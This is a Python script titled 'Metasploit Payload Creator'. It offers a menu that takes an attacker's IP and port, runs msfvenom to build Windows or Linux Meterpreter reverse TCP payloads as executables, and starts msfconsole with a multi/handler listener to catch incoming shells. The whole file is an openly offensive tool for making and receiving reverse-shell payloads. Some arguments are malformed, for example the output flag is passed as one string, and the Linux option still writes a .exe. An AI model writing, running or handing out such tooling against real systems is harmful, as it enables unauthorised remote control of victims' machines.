import subprocess
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

def install_dependencies():
    print(Fore.YELLOW + "Checking for required dependencies...")
    try:
        subprocess.run(['msfvenom', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['msfconsole', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(Fore.GREEN + "Dependencies already installed.")
    except FileNotFoundError:
        print(Fore.RED + "Required dependencies not found.")
        print(Fore.YELLOW + "Please make sure Metasploit Framework is installed and in your PATH.")
        print(Fore.YELLOW + "Refer to the Metasploit website for installation instructions.")
        return False
    return True

def create_payload():
    print(Fore.YELLOW + "Choose payload type:")
    print(Fore.CYAN + "1. Windows Meterpreter Reverse TCP")
    print("2. Linux Meterpreter Reverse TCP")
    print("3. Exit")
    choice = input("Enter your choice: ")

    if choice == '1':
        lhost = input("Enter LHOST (Attacker's IP address): ")
        lport = input("Enter LPORT: ")
        payload_type = "windows/meterpreter/reverse_tcp"
        generate_payload(payload_type, lhost, lport)
    elif choice == '2':
        lhost = input("Enter LHOST (Attacker's IP address): ")
        lport = input("Enter LPORT: ")
        payload_type = "linux/meterpreter/reverse_tcp"
        generate_payload(payload_type, lhost, lport)
    elif choice == '3':
        print(Fore.RED + "Exiting...")
        return
    else:
        print(Fore.RED + "Invalid choice.")
        create_payload()

def generate_payload(payload_type, lhost, lport):
    payload_file = input("Enter output filename (without extension): ")
    try:
        subprocess.run(['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'exe', f'-o {payload_file}.exe'])
        print(Fore.GREEN + f"Payload generated successfully as {payload_file}.exe")
    except Exception as e:
        print(Fore.RED + "Error:", e)

def launch_msfconsole():
    try:
        subprocess.run(['msfconsole', '-q', '-x', 'use multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j'])
    except FileNotFoundError:
        print(Fore.RED + "msfconsole not found. Make sure Metasploit Framework is installed and in your PATH.")

if __name__ == "__main__":
    if not install_dependencies():
        exit()
    while True:
        print("\n" + Fore.MAGENTA + "Metasploit Payload Creator")
        print(Fore.CYAN + "1. Create Payload")
        print("2. Launch msfconsole")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            create_payload()
        elif choice == '2':
            launch_msfconsole()
        elif choice == '3':
            print(Fore.RED + "Exiting...")
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again.")
